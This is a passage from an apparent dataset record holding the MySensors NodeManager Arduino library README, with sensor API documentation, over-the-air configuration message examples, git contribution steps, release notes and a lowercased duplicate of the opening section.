411);\nvoid setKnownPpm(float value);\n// [105] define how many samples we are going to take in the calibration phase (default: 50);\nvoid setCalibrationSamples(int value);\n// [106] define the time (in milisecond) between each sample in the cablibration phase (default: 500);\nvoid setCalibrationSampleInterval(int value);\n// [107] define how many samples you are going to take in normal operation (default: 50);\nvoid setSamples(int value);\n// [108] define the time (in milisecond) between each sample in the normal operations (default: 5);\nvoid setSampleInterval(int value);\n// [109] set the ppm (x) of a random point on the gas curve (default: 200)\nvoid setPoint1Ppm(float value);\n// [110] set the Rs/Ro ratio (y) of the same random point on the gas curve (default: 5)\nvoid setPoint1Ratio(float value);\n// [111] set the ppm (x) of another random point on the gas curve (default: 10000)\nvoid setPoint2Ppm(float value);\n// [112] set the Rs/Ro ratio (y) of the same random point on the gas curve (default: 1.2)\nvoid setPoint2Ratio(float value);\n// [113] with ppm = scaling_factor*x^exponent set the value manually, otherwise will be calculated automatically based on the two points provided\nvoid setCurveScalingFactor(float value);\n// [114] with ppm = scaling_factor*x^exponent set the value manually, otherwise will be calculated automatically based on the two points provided\nvoid setCurveExponent(float value);\n// do not report for the given number of minutes, waiting for the sensor to warm up (default: 0);\nvoid setWarmupMinutes(int value);\nSensorTSL2561\n// [101] set the gain, possible values are SensorTSL2561::GAIN_0X (0), SensorTSL2561::GAIN_16X (1) (default 16x)\nvoid setGain(int value);\n// [102] set the timing, possible values are SensorTSL2561::INTEGRATIONTIME_13MS (0), SensorTSL2561::INTEGRATIONTIME_101MS (1), SensorTSL2561::INTEGRATIONTIME_402MS (2) (default: 13ms)\nvoid setTiming(int value);\n// [103] set the spectrum, possible values are SensorTSL2561::VISIBLE (0), SensorTSL2561::FULLSPECTRUM (1), SensorTSL2561::INFRARED (2), SensorTSL2561::FULL (3) (default: visible)\nvoid setSpectrum(int value);\n// [104] set the i2c address values are SensorTSL2561::ADDR_FLOAT, SensorTSL2561::ADDR_LOW, SensorTSL2561::ADDR_HIGH\nvoid setAddress(int value);\nSensorPT100\n// [101] set the voltageRef used to compare with analog measures\nvoid setVoltageRef(float value);\nSensorSDS011\n// Sleep sensor after measurment. This powers down the fan but increases measurment time. (default: true)\nvoid setSleep(bool value);\nSensorDimmer\n// [101] set the effect to use for a smooth transition, can be one of SensorDimmer::EASE_LINEAR, SensorDimmer::EASE_INSINE, SensorDimmer::EASE_OUTSINE, SensorDimmer::EASE_INOUTSINE (default: EASE_LINEAR)\nvoid setEasing(int value);\n// [102] the duration of entire the transition in seconds (default: 1)\nvoid setDuration(int value);\n// [103] the duration of a single step of the transition in milliseconds (default: 100)\nvoid setStepDuration(int value);\n// [104] reverse cathod and anode (default: false)\nvoid setReverse(bool value);\n// set the status of the dimmer\nvoid setStatus(int value);\n// set the percentage of the dimmer\nvoid setPercentage(int value);\nSensorPulseMeter / SensorRainGauge / SensorPowerMeter / SensorWaterMeter\n// [102] set how many pulses for each unit (e.g. 1000 pulses for 1 kwh of power, 9 pulses for 1 mm of rain, etc.)\nvoid setPulseFactor(float value);\nDisplaySSD1306\n// set device\nvoid setDev(const DevType* dev);\n// set i2c address\nvoid setI2CAddress(uint8_t i2caddress);\n// set text font (default: &Adafruit5x7)\nvoid setFont(const uint8_t* font);\n// [102] set the contrast of the display (0-255)\nvoid setContrast(uint8_t value);\n// [104] Rotate the display 180 degree (use rotate=false to revert)\nvoid rotateDisplay(bool rotate = true);\n// [105] Text font size (possible are 1 and 2; default is 1)\nvoid setFontSize(int fontsize);\n// [106] Text caption font size (possible are 1 and 2; default is 2)\nvoid setHeaderFontSize(int fontsize);\n// [107] Invert display (black text on color background; use invert=false to revert)\nvoid invertDisplay(bool invert = true);\n// set a static caption text on header of the display\nvoid setCaption(const char* value);\n// print a static caption on top of the screen\nvoid printCaption(const char* value);\n// print the given string\nvoid print(const char* value);\n// print the given string and goes to the next line\nvoid println(const char* value);\n// print the value of the given child\nvoid printChild(Child* child);\n// clear the display\nvoid clear();\n// set the cursor to the given position\nvoid setCursor(int col,int row);\n// return the display object\nSSD1306AsciiAvrI2c* getDisplay();\nSensorChirp\n// [101] set the soil moisture offset (default: 0)\nvoid setMoistureOffset(int value);\n// [102] set the soil moisture range (default: 0)\nvoid setMoistureRange(int value);\n// [103] return the soil moisture normalized (default: false)\nvoid setReturnMoistureNormalized(bool value);\n// [104] reverse the light value (default: true)\nvoid setReturnLightReversed(bool value);\nDisplayHD44780\n// set i2c address (default: 0x38)\nvoid setI2CAddress(uint8_t i2caddress);\n// set the backlight (default: HIGH)\nvoid setBacklight(uint8_t value);\n// set a static caption text on header of the display\nvoid setCaption(const char* value);\n// print a static caption on top of the screen\nvoid printCaption(const char* value);\n// print the given string\nvoid print(const char* value);\n// print the given string and goes to the next line\nvoid println(const char* value);\n// print the value of the given child\nvoid printChild(Child* child);\n// clear the display\nvoid clear();\n// set the cursor to the given position\nvoid setCursor(int col,int row);\n// return the display object\nLiquidCrystal_I2C* getDisplay();\nSensorTTP\n// set the passcode length. Passcode will be sent to the controller only after this number of digits have been pressed (default: 4)\nvoid setPasscodeLength(int value);\n// set the clock pin (default: 6)\nvoid setClockPin(int8_t value);\n// set the SDO pin (default: 5)\nvoid setSdoPin(int8_t value);\n// set the DV pin (default: 3)\nvoid setDvPin(int8_t value);\n// set the RST pin (default: 4)\nvoid setRstPin(int8_t value);\nSensorServo\n// set the servo to the given percentage\nvoid setPercentage(int value);\nSensorNeopixel\n// set how many NeoPixels are attached\nvoid setNumPixels(int value);\n// set default brightness\nvoid setDefaultBrightness(int value) {\n// format expected is:\n//<pixel_number from>-<pixel_number to>,<RGB color in a packed 24 bit format>\n//<pixel_number>,<RGB color in a packed 24 bit format>\n//<RGB color in a packed 24 bit format>\nvoid setColor(char* string);\n// brightness for all LEDs\nvoid setBrightness(int value)\nSensorFPM10A\n// set the baud rate of the serial port for connecting to the sensor (default: 57600)\nvoid setBaudRate(uint32_t value);\n// set the password for connecting to the sensor (default: 0)\nvoid setPassword(uint32_t value);\n// [101] set the minimum confidence below which the match is not considered valid (default: 0)\nvoid setMinConfidence(uint16_t value);\n// [102] wait for a valid fingerprint for the given amount of seconds. Useful when battery powered (default: 0)\nvoid setWaitFingerForSeconds(int value);\n// return true if the fingerprint was recognized successfully, false otherwise. Useful when a hook function needs to act upon the result\nbool getFingerprintIsValid();\nSensorPH\n// setting AnalogRefValue (default: 5.0)\nvoid setVoltageRef(float value);\n// setting the voltage value @ph = 7 (default: 2.52)\nvoid setPH7Voltage(float value);\n// setting the voltage value @ph = 4 (default: 3.04)\nvoid setPH4Voltage(float value);\nSensorPca9685W\n// [101] set the effect to use for a smooth transition, can be one of SensorDimmer::EASE_LINEAR (0), SensorDimmer::EASE_INSINE (1), SensorDimmer::EASE_OUTSINE (2), SensorDimmer::EASE_INOUTSINE (3) (default: EASE_LINEAR)\nvoid setEasing(int value);\n// [102] the duration of entire the transition in seconds (default: 1)\nvoid setDuration(int value);\n// [103] the duration of a single step of the transition in milliseconds (default: 100)\nvoid setStepDuration(int value);\n//get instance of PCA9685-board\nAdafruit_PWMServoDriver* getPWMServoDriver();\n//set instance of PCA9685-board, if using more than one pca9685-dimmer sensor on the same pca9685-board\nvoid setPWMServoDriver(Adafruit_PWMServoDriver* servoDriver);\n//set the RGB (red/green/blue) value as hex-string (e.g. 000000...black/off, ff0000...red, 00ff00...green, 0000ff...blue, ffa500...orange, ffffff...white)\nvoid setRgbVal(String hexstring);\n//get the current RGB (red/green/blue) value as hex-string\nString getRgbVal();\nSensorPca9685Rgb\n// [101] set the effect to use for a smooth transition, can be one of SensorDimmer::EASE_LINEAR (0), SensorDimmer::EASE_INSINE (1), SensorDimmer::EASE_OUTSINE (2), SensorDimmer::EASE_INOUTSINE (3) (default: EASE_LINEAR)\nvoid setEasing(int value);\n// [102] the duration of entire the transition in seconds (default: 1)\nvoid setDuration(int value);\n// [103] the duration of a single step of the transition in milliseconds (default: 100)\nvoid setStepDuration(int value);\n//get instance of PCA9685-board\nAdafruit_PWMServoDriver* getPWMServoDriver();\n//set instance of PCA9685-board, if using more than one pca9685-dimmer sensor on the same pca9685-board\nvoid setPWMServoDriver(Adafruit_PWMServoDriver* servoDriver);\n//set the RGB (red/green/blue) value as hex-string (e.g. 000000...black/off, ff0000...red, 00ff00...green, 0000ff...blue, ffa500...orange, ffffff...white)\nvoid setRgbVal(String hexstring);\n//get the current RGB (red/green/blue) value as hex-string\nString getRgbVal();\nSensorPca9685Rgbw\n// [101] set the effect to use for a smooth transition, can be one of SensorDimmer::EASE_LINEAR (0), SensorDimmer::EASE_INSINE (1), SensorDimmer::EASE_OUTSINE (2), SensorDimmer::EASE_INOUTSINE (3) (default: EASE_LINEAR)\nvoid setEasing(int value);\n// [102] the duration of entire the transition in seconds (default: 1)\nvoid setDuration(int value);\n// [103] the duration of a single step of the transition in milliseconds (default: 100)\nvoid setStepDuration(int value);\n//get instance of PCA9685-board\nAdafruit_PWMServoDriver* getPWMServoDriver();\n//set instance of PCA9685-board, if using more than one pca9685-dimmer sensor on the same pca9685-board\nvoid setPWMServoDriver(Adafruit_PWMServoDriver* servoDriver);\n//set the RGBW (red/green/blue/white) value as hex-string (see RGB-examples from PCA9685RGB and add \"00\"..\"ff\" for the white-channel)\nvoid setRgbwVal(String hexstring);\n//get the current RGBW (red/green/blue/white) value as hex-string\nString getRgbwVal();\nSensorDSM501A\n// [101] set the reference temperature for calculating PM1.0\nvoid setTemperature(int value);\nSensorPN532\n// [101] wait for a valid card for the given amount of seconds. Useful when battery powered (default: 0)\nvoid setWaitCardForSeconds(int value);\n// return true if the card was recognized successfully, false otherwise. Useful when a hook function needs to act upon the result\nbool getCardIsValid();\nSensorCCS811\n// [101] set the temperature for calibrating the sensor\nvoid setTemperature(float value);\n// Set to true if the board has a temperature sensor embedded that can be used for calibration (default: false)\nvoid setTemperatureSensor(bool value);\nSensorMPR121\n// set the passcode length. Passcode will be sent to the controller only after this number of digits have been pressed (default: 4)\nvoid setPasscodeLength(int value);\n// [101] wait for a valid code for the given amount of seconds. Useful when battery powered (default: 0)\nvoid setWaitCodeForSeconds(int value);\n// return true if the code was recognized successfully, false otherwise. Useful when a hook function needs to act upon the result\nbool getCodeIsValid();\nSensorGSM\n// set the baud rate of the serial port for connecting to the sensor (default: 115200)\nvoid setBaudRate(uint32_t value);\n// [101] set the recipient phone number\nvoid setRecipient(const char* value);\n// send the provided text via SMS to the configured recipient\nvoid sendSMS(const char* text);\nOTA Configuration\nWhen NODEMANAGER_OTA_CONFIGURATION is set to ON the API presented above can be also called remotely through SensorConfiguration, which is automatically added to NodeManager. SensorConfiguration exposes by default child id 200 that can be used to interact with the service by sending V_CUSTOM type of messages and commands within the payload. For each REQ message, the node will respond with a SET message if successful.\nAlmost all the functions made available through the API can be called remotely. To do so, the payload must be in the format <child_id>,<function_id>[,<value_to_set>] where child_id is the recipient child id you want to communicate with (the node has child id 0), function_id is the number between square brackets you can find in the API documentation and, if the function takes and argument, this can be passed along in value_to_set. For example, to change the sleep time to e.g. 10 minutes:\n// [4] set the duration (in minutes) of a sleep cycle\nvoid setSleepMinutes(unsigned long value);\n<node_id>;<configuration_child_id>;<req>;0;<V_CUSTOM>;<child_id>,<function_id>,<value> 100;200;2;0;48;0,4,10\nTo wake up a node previously configured as sleeping, send the following as the node wakes up next:\n// [9] wake up the board\nvoid wakeup();\n100;200;2;0;48;0,9\nif you want to collect and average 10 samples for the sensor on child_id 1:\n// [5] For some sensors, the measurement can be queried multiple times and an average is returned (default: 1)\nvoid setSamples(unsigned int value);\n100;200;2;0;48;1,5,10\nIf you want to decrease the temperature offset of a thermistor sensor to -2:\n// [105] set a temperature offset\nvoid setOffset(float value);\n100;200;2;0;48;1,105,-2\nPlease note that anything set remotely will NOT persist a reboot apart from the sleep interval which is saved to the EEPROM if setSaveSleepSettings() is set.\nHow it works\nYour sketch should begin with the standard MySensors directives\nNodeManager's settings can be customized through NODEMANAGER_* defines, just after. If not set, the default value will be used\nTo make use of the NodeManager library you have to include it with #include <MySensors_NodeManager.h>. This automatically includes the required MySensors libraries and creates an object called nodeManager\nTo add a sensor, just include the corresponding header file and creates an instance of the class\nInteraction with your code happens through callback functions, placed at the end of before(), presentation(), loop(), receive() and receiveTimes().\nThe following is detailed what happens when the different callback functions are called:\nNodeManager::before():\nSetup the interrupt pins to wake up the board based on the configured interrupts\nRestore from the EEPROM the latest sleeping settings, if setSaveSleepSettings() was set\nCreate and register an instance of SensorConfiguration\nNodeManager::presentation():\nPresent the sketch\nPresent each child of each of each registered sensors\nNodeManager::setup():\nSync the time with the controller (if requested)\nSetup the SD card reader (if requested)\nCall setup() of each registered sensor\nSetup the interrupts as requested by the sensors\nSensor::setup():\nInitialize the timers\nCall the sensor-specific implementation of setup by invoking onSetup()\nNodeManager::loop():\nSync the time with the controller if not done recently\nIf all the sensors are powered by a pin, this is turned on\nCall loop() of each of the registered sensor\nIf all the sensors are powered by a pin, this is turned off\nGo to sleep (if requested)\nSensor::loop():\nIf it is time to take a new measure he sensor-specific onLoop() is called. If multiple samples are requested, this is run multiple times. onLoop() is not intended to send out any message but just sets a new value to the requested child\nIf it is time to report, a message is sent to the gateway with the value. Depending on the configuration, this is not sent if it is the same as the previous value or sent anyway after a given number of cycles. These functionalities are not sensor-specific and common to all the sensors inheriting from the Sensor class.\nNodeManager::receive():\nReceive a message from the radio network\nDispatch the message to the recipient sensor\nSensor::receive():\nInvoke Sensor::loop() which will execute the sensor main task and eventually call Sensor::onReceive()\nSensor::interrupt():\nCheck if the value from the interrupt is matching the one expected\nCalls the sensor's implementation of onInterrupt() to handle the interrupt\nEach sensor is in dedicated header file under the sensors directory of the library which has be directly included if needed into the main sketch. The implementation of the class is inline. Required libraries and OTA configuration request handling is everything happening inside the class.\nContributing\nContributes to NodeManager are of course more than welcome.\nReporting an issue or request an enhancement\nFor reporting an issue, requesting support for a new sensor or any other kind of enhancement, please drop a message either on the project's main page (https://www.mysensors.org/download/node-manager), on the MySensors Forum (https://forum.mysensors.org/category/43/nodemanager) or open an issue directly on Github (https://github.com/mysensors/NodeManager/issues).\nContributing to the code\nIf you want to contribute to the code, a pull request on Github is the way to go. First of all setup your development environment:\nCreate a copy of the project in your Github account by clicking on the \"Fork\" button on https://github.com/mysensors/NodeManager\nCheck the copy actually exists on https://github.com/<username>/NodeManager\nClone your repository on your computer: git clone https://github.com/<username>/NodeManager.git\nConfigure the main project's repository as an upstream: git remote add upstream https://github.com/mysensors/NodeManager.git\nCreate and switch to a local development branch: git checkout -b development origin/development\nBefore applying any change, always ensure you have the latest development version available:\nSwitch to your local development branch: git checkout development\nFetch the latest version from the main project's repository: git fetch upstream\nMerge into your development copy all the changes from the main repository: git merge development upstream/development\nUpdate the development branch of your repository: git push origin development\nCreate a branch for the fix/feature you want to work on and apply changes to the code:\nCreate and switch to a new branch (give it a significant name, e.g. fix/enum_sensors): git checkout -b <yourbranch>\nDo any required change to the code\nInclude all the files changed for your commit: git add .\nCommit the changes: git commit -m\"Use enum instead of define for defining each sensor #121\"\nPush the branch with the changes to your repository: git push origin <yourbranch>\nVisit https://github.com/<username>/NodeManager/branches and click the \"New pull request\" button just aside your newly created branch\nFill in the request with a significant title and description and select the \"development\" branch (this step is very important)\nSubmit the request and start the discussion. After a few seconds, the configured Continuous Integration tool will automatically compile your code and check for errors\nAny additional commits to your branch which will be presented within the same pull request\nWhen the pull request is merged, feel free delete your local branch: git branch -D <yourbranch>\nUpdate your local and remote development branch as per the instructions above\nIf there are changes introduced to the development branch that conflicts with an open pull request, you will have to resolve the conflicts and update the PR:\nFetch and merge into development any change from upstream/development as detailed above\nSwitch to your branch: git checkout <yourbranch>\nRebase the branch you filed the PR from against your updated development branch: git rebase development\nResolve the conflicts and commit again\nForce push your updated branch so the PR gets updated: git push HEAD:<yourbranch> -f\nContributing with a new sensor\nWhen contributing with a new sensor follows the same guidelines presented above and proceed with the following steps:\nDefine your class is in a header file named SensorNAME_OF_THE_SENSOR.h under the sensors directory\nImplement your sensor inline with the class. See SensorExample.h or other sensors for more commented examples and details\nAdd your sensor in examples/Templates/Template.ino, just after the last sensor\nAdd an additional job in the Travis CI configuration file .travis.yml\nAdd the sensor's specs in \"Add your sensors\" and in \"Built-in sensors API\" of the README.md file\nAdd the name of the class of your sensor in the keywords.txt file\nCompatibility\nThis version of NodeManager has been tested and is compatible with the following MySensors library:\nv2.3.0\nv2.2.0\nv2.1.1\nYou don't necessarily need a NodeManager gateway to interact with a NodeManager node. A NodeManager node is fully compatible with any existing gateway you are currently operating with.\nThere are generally speaking no compatibility issues in having in your network nodes running different versions of NodeManager.\nStarting from v1.8 NodeManager is released as an Arduino library hence your code has to be migrated manually from previous versions.\nRelease Notes\nv1.0:\nInitial release\nv1.1:\nAdded ability to sleep between send() so to save additional battery\nBug fixes\nv1.2:\nAdded out-of-the-box support for BH1750 light sensor\nAdded out-of-the-box support for HTU21D temperature and humidity sensor\nAdded out-of-the-box support for MLX90614 contactless temperature sensor\nAdded a few examples to the documentation\nFixed a few bugs\nv1.3:\nAdded support for BME280 temperature/humudity/pressure sensor\nAdded option to measure battery level via a pin in addition to internal Vcc\nAdded example sketches to the documentation\nFixed a few bugs\nv1.4:\nAdded support for ML8511 UV intensity sensor\nAdded support for MQ air quality sensor\nAdded ability to manually assign a child id to a sensor\nEnsured compatibility for non-sleeping nodes\nAbility to control if waking up from an interrupt counts for a battery level report\nWhen power pins are set the sensor is powered on just after\nService messages are disabled by default\nBug fixes\nv1.5:\nAdded support for ACS712 current sensor\nAdded support for HC-SR04 distance sensor\nAdded support for BMP085/BMP180 temperature and pressure sensor\nAdded support for Sonoff smart switch\nAdded support for Rain Gauge sensor\nAdded support for MCP9808 temperature sensor\nAdded forecast output to all Bosch sensors\nAdded I2C address auto-discovery for all Bosch sensors\nAdded support for running as a gateway\nAdded option to retrieve the latest value of a sensor from outside NodeManager\nRemote reboot now does not need a reboot pin configured\nA heartbeat is now sent also when waking up from a wait cycle\nWhen waking up for an interrupt, only the code of the sensor expecting that interrupt is executed\nAdded capability to retrieve the time from the controller\nOptimized battery life for DS18B20 sensors\nSLEEP_MANAGER has been deprecated (now always enabled) and setMode() replaces setSleepMode()\nNew mode ALWAYS_ON to let the node staying awake and executing each sensors' loop\nESP8266WiFi.h has to be included in the main sketch if MY_GATEWAY_ESP8266 is defined\nAdded receiveTime() wrapper in the main sketch\nFixed the logic for output sensors\nAdded common gateway settings in config.h\nv1.6:\nIntroduced new remote API to allow calling almost ALL NodeManager's and its sensors' functions remotely\nReporting interval configuration is now indipendent from the sleep cycle\nReporting interval can be customized per-sensor\nAll intervals (measure/battery reports) are now time-based\nAdded support for BMP280 temperature and pressure sensor\nAdded support for RS485 serial transport\nAdded support for TSL2561 light sensor\nAdded support for DHT21 temperature/humidity sensor\nAdded support for AM2320 temperature/humidity sensor\nAdded support for PT100 high temperature sensor\nAdded support for MH-Z19 CO2 sensor\nAdded support for analog rain and soil moisture sensors\nAdded support for generic dimmer sensor (PWM output)\nAdded support for power and water meter pulse sensors\nRadio signal level (RSSI) is now reported automatically like the battery level\nSensorRainGauge now supports sleep mode\nSensorSwitch now supports awake mode\nSensorLatchingRealy now handles automatically both on and off commands\nSensorMQ now depends on its own module\nAdded safeguard (automatic off) to SensorDigitalOutput\nAny sensor can now access all NodeManager's functions\nDHT sensor now using MySensors' DHT library\nv1.7:\nReviewed the entire NodeManager's architecture with children now automatically created from within each sensor\nOptimized the code so to use the memory in a more efficient manner\nImproved the overall user experience, also with sensors' patterns in the main sketch\nSensors can now be enabled by uncommenting the corresponding USE_* define and requiring a single line to be created and initialized\nNodeManager's advanced features can be enabled/disabled by setting the corresponding NODEMANAGER_* define\nSimplified the configuration of each sensor, now without the need of getting the sensor back through a nasty casting\nMerged config.h into the main sketch so to centralize the configuration in a single place\nAdded time-aware capability, with or without an attached RTC\nIntra-sensor communication now possible with the possibility for the user to nicely hook into the sensor's code\nBatery and signal reports are now available through the regular sensors SensorBattery and SensorSignal\nRemote API interaction for all the sensors has been moved into the regular sensor SensorConfiguration\nFixed bug preventing negative temperatures to be reported for all the sensors\nAdded ability for each sensor to report only when value is above or below a configured threshold\nAddded support for SD card reader\nAdded support for RFM95 radio\nAdded supoport for MySensors Sensebender Gateway and Sensebender Micro boards\nAdded support for generic LCD devices through an abstract Display class\nSensorDimmer now supports both V_STATUS and V_PERCENTAGE\nSensorPulseMeter now supports running on batteries\nSensorDs18B20 optimized and now supporting V_ID\nSensorSwitch (now renamed into SensorInterrupt) now catches interrupt in a more reliable way\nSensorLatchingRelay now specialized and renamed into SensorLatchingRelay1Pin and SensorLatchingRelay2Pins\nAdded support for HD44780 i2c LCD\nAdded support for MG996R Servo sensor\nAdded support for VL53L0X laser time-of-flight distance sensor\nAdded support for SensorPlantowerPMS particulate matter sensors\nAdded support for SHT31 temperature and humidity sensor\nAdded support for SI7021 temperature and humidity sensor\nAdded support for for Neopixel LED\nAdded support for Chirp Sensor soil moisture sensor\nAdded support for SparkFun RGB and Gesture Sensor\nAdded support for TTP226/TTP229 Touch control sensor\nv1.8:\nSplit NodeManager's core classes in individual files and each sensor code in its own dedicated header file\nNew Arduino-compatible library structure to allow easier integration and more consistent updates across version\nIncluded a complete set of examples which can be loaded directly from the Arduino IDE\nSimplified the template sketch with a global nodeManager object and sensors that can be imported directly from there\nDebug output is now fully compatible with the one used by the MySensors library and integrated into MySensors LogParser\nBetter control on how often, if and when to sync the time with the controller for time-aware nodes\nAdded a Measure Timer so to allow splitting between taking measures and reporting\nAdded support for every sensor to keep track of the last value assigned to a child in EEPROM and restoring it upon a reboot\nIntroduced new capabilities for reporting every minute/hour/day or only at a given minute/hour/day\nAdded ability to read from the serial port at the end of each loop cycle, useful for debugging interactive sensors\nAdded support for pH sensor\nAdded support for PCA9685 as RGB/RGBW/W dimmer\nAdded support for DSM501A dust sensor\nAdded support for PN532 NFC RFID module\nAdded support for CCS811 CO2/VOC sensor\nAdded support for MPR121 Capacitive Touch Sensor\nAdded support for serial GSM/SMS device\nAdded support for FPM10A fingerprint sensor\nAdded support for SDS011 Air quality sensor\nAdded support for ESP32 devices\nAdded support for nRF52 radio\nImproved SensorDigitalInput and NeoPixelSensor\nSi7021 sensor is now using the library from the MySensors example\nReviewed the MQ Sensor implementation\nOptimized memory utilization\nAdded Travis Continuous Integration tests\nFixed wrong battery report when using battery pin and SensorRain/SensorSoilMoisture\nFixed DigitalOutput safeguard not working as expected\nFixed radio signal level reporting wrong values\nFixed SensorLatchingRelay2Pins wrong pin selection\nOther minor bug fixes", "link": "https://github.com/mysensors/NodeManager", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mysensors nodemanager\nnodemanager is intended to take care on your behalf of all those common tasks that a mysensors node has to accomplish, speeding up the development cycle of your projects. consider it as a sort of frontend for your mysensors projects. when you need to add a sensor (which requires just uncommeting a single line), nodemanager will take care of importing the required library, presenting the sensor to the gateway/controller, executing periodically the main function of the sensor (e.g. measure a temperature, detect a motion, etc.), allowing you to interact with the sensor and even configuring it remotely.\nfeatures\nallows managing automatically the complexity behind battery-powered sensors spending most of their time sleeping\nprovides common functionalities to read and report the battery level\nfor the most common sensors, provide embedded code so to allow their configuration with a single line\nmanage all the aspects of a sleeping cycle by leveraging smart sleep\nallow configuring the node and any attached sensors remotely\nallow waking up a sleeping node remotely at the end of a sleeping cycle\nallow powering on each connected sensor only while the node is awake to save battery\nreport battery level periodically and automatically or on demand\ncalculate battery level without requiring an additional pin and the resistors\nreport signal level periodically and automatically or on demand\nallow collecting and averaging multiple samples, tracking the last value and forcing periodic updates for any sensor\nprovide built-in capabilities to handle interrupt-based sensors\ninstallation\ndownload the package or clone the git repository from https://github.com/mysensors/nodemanager\ninstall nodemanager as an arduino library (https://www.arduino.cc/en/guide/libraries)\nupgrade\nmake a backup copy of the library, remove it, download the latest version of nodemanager and install the new library\nreview the release notes in case there is any manual change required to the main sketch\nplease be aware when upgrading to v1.8 from an older version this procedure is not supported and the code should be migrated manually.\nconfiguration\nopen the template sketch from the arduino ide under file -> examples -> mysensors nodemanager -> template\nalternatively, open one of the provided example\ncustomize nodemanager's and your sensors settings (see below)\nmysensors configuration\nsince nodemanager has to communicate with the mysensors network on your behalf, it has to know how to do it. on top of the template sketch you will find the typical mysensors directives you are used to which can be customized to configure the board to act as a mysensors node or a mysensors gateway.\nnodemanager configuration\nnodemanager built-in capabilities can be enabled/disabled also when you need to save some storage for your code. to enable/disable a built-in feature:\ninstall the required dependency if any\nenable the corresponding capability by setting it to on in the main sketch. to disable it, set it to off\nwhen a capability is enabled additional functions may be made available. have a look at the api documentation for details\na list of the supported capabilities and the required dependencies is presented below:\ncapability default description dependencies\nnodemanager_debug on nodemanager's debug output on serial console -\nnodemanager_debug_verbose off increase nodemanager's debug output on the serial console -\nnodemanager_power_manager off allow powering on your sensors only while the node is awake -\nnodemanager_interrupts on allow managing interrupt-based sensors like a pir or a door sensor -\nnodemanager_conditional_report off allow reporting a measure only when different from the previous or above/below a given threshold -\nnodemanager_eeprom off allow keeping track of some information in the eeprom -\nnodemanager_sleep on allow managing automatically the complexity behind battery-powered sleeping sensors -\nnodemanager_receive on allow the node to receive messages; can be used by the remote api or for triggering the sensors -\nnodemanager_time off allow keeping the current system time in sync with the controller https://github.com/paulstoffregen/time\nnodemanager_rtc off allow keeping the current system time in sync with an attached rtc device https://github.com/jchristensen/ds3232rtc\nnodemanager_sd off allow reading from and writing to sd cards -\nnodemanager_hooking off allow custom code to be hooked in the out of the box sensors -\nnodemanager_ota_configuration off allow over-the-air configuration of the sensors -\nnodemanager_serial_input off read from the serial port at the end of each loop cycle expecting a serial protocol command -\nonce the nodemanager library header file is included, a global instance of the nodemanager class called nodemanager is made available and can be used all along the sketch.\nadd your sensors\nnodemanager provides built-in implementation of a number of sensors through ad-hoc classes located within the \"sensors\" directory of the library. to use a built-in sensor:\ninstall the required dependencies, if any manually or through the arduino ide library manager (see below)\ninclude the sensor header file (e.g. #include <sensors/sensorbattery.h>)\ncreate an instance of the sensor's class (e.g. sensorbattery battery(node))\nonce created, the sensor will automatically present one or more child to the gateway and controller. a list of built-in sensors, required dependencies and the number of child automatically created is presented below:\nsensor/class name #child description dependencies\nsensorbattery 1 built-in sensor for automatic battery reporting -\nsensorsignal 1 built-in sensor for automatic signal level reporting -\nsensoranaloginput 1 generic analog sensor, return a pin's analog value or its percentage -\nsensorldr 1 ldr sensor, return the light level of an attached light resistor in percentage -\nsensorrain 1 rain sensor, return the percentage of rain from an attached analog sensor -\nsensorsoilmoisture 1 soil moisture sensor, return the percentage of moisture from an attached analog sensor -\nsensorthermistor 1 thermistor sensor, return the temperature based on the attached thermistor -\nsensorml8511 1 ml8511 sensor, return uv intensity -\nsensoracs712 1 acs712 sensor, measure the current going through the attached module -\nsensordigitalinput 1 generic digital sensor, return a pin's digital value -\nsensordigitaloutput 1 generic digital output sensor, allows setting the digital output of a pin to the requested value -\nsensorrelay 1 relay sensor, allows activating the relay -\nsensorlatchingrelay1pin 1 latching relay sensor, allows toggling the relay with a pulse on the configured pin -\nsensorlatchingrelay2pins 1 latching relay sensor, allows turing the relay on and off with a pulse on the configured pins -\nsensordht11 2 dht11 sensor, return temperature/humidity based on the attached dht sensor https://github.com/mysensors/mysensorsarduinoexamples/tree/master/libraries/dht\nsensordht22 2 dht22 sensor, return temperature/humidity based on the attached dht sensor https://github.com/mysensors/mysensorsarduinoexamples/tree/master/libraries/dht\nsensorsht21 2 sht21 sensor, return temperature/humidity based on the attached sht21 sensor https://github.com/sodaqmoja/sodaq_sht2x\nsensorhtu21d 2 htu21d sensor, return temperature/humidity based on the attached htu21d sensor https://github.com/sodaqmoja/sodaq_sht2x\nsensorinterrupt 1 generic interrupt-based sensor, wake up the board when a pin changes status -\nsensordoor 1 door sensor, wake up the board and report when an attached magnetic sensor has been opened/closed -\nsensormotion 1 motion sensor, wake up the board and report when an attached pir has triggered -\nsensords18b20 1+ ds18b20 sensor, return the temperature based on the attached sensor https://github.com/milesburton/arduino-temperature-control-library\nsensorbh1750 1 bh1750 sensor, return light level in lux https://github.com/claws/bh1750\nsensormlx90614 2 mlx90614 contactless temperature sensor, return ambient and object temperature https://github.com/adafruit/adafruit-mlx90614-library\nsensorbme280 4 bme280 sensor, return temperature/humidity/pressure based on the attached bme280 sensor https://github.com/adafruit/adafruit_bme280_library\nsensorbmp085 3 bmp085 sensor, return temperature and pressure https://github.com/adafruit/adafruit-bmp085-library\nsensorbmp180 3 bmp180 sensor, return temperature and pressure https://github.com/adafruit/adafruit-bmp085-library\nsensorbmp280 3 bmp280 sensor, return temperature/pressure based on the attached bmp280 sensor https://github.com/adafruit/adafruit_bmp280_library\nsensorsonoff 1 sonoff wireless smart switch https://github.com/thomasfredericks/bounce2\nsensorhcsr04 1 hc-sr04 sensor, return the distance between the sensor and an object https://github.com/mysensors/mysensorsarduinoexamples/tree/master/libraries/newping\nsensormcp9808 1 mcp9808 sensor, measure the temperature through the attached module https://github.com/adafruit/adafruit_mcp9808_library\nsensormq 1 mq sensor, return ppm of the target gas. tuned by default for mq135 and co2 -\nsensormhz19 1 mh-z19 co2 sensor via uart (softwareserial, default on pins 6(rx) and 7(tx) -\nsensoram2320 2 am2320 sensors, return temperature/humidity based on the attached am2320 sensor https://github.com/thakshak/am2320\nsensortsl2561 1 tsl2561 sensor, return light in lux https://github.com/adafruit/tsl2561-arduino-library\nsensorpt100 1 dfrobot driver high temperature sensor, return the temperature from the attached pt100 sensor https://github.com/nxcosa/hightemperaturesensor\nsensordimmer 1 generic dimmer sensor used to drive a pwm output -\nsensorraingauge 1 rain gauge sensor -\nsensorpowermeter 1 power meter pulse sensor -\nsensorwatermeter 1 